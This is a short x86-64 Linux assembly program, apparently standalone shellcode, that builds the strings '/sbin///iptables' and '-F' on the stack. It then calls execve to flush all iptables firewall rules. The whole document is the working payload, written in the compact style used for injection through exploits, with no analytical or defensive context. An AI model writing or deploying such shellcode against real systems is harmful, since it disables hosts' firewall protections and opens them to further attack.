section .text
    global _start
     
_start:
    push 0x3b
    pop rax
    cdq

    push    rdx
    push    word 0x462d
    push    rsp
    pop     rcx
    
    push    rdx 
    mov     rbx, 0x73656c6261747069
    push    rbx
    mov     rbx, 0x2f2f2f6e6962732f
    push    rbx
    push    rsp
    pop     rdi
     
    push    rdx
    push    rcx
    push    rdi
    push    rsp
    pop     rsi
     
    ; execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL);
    syscall
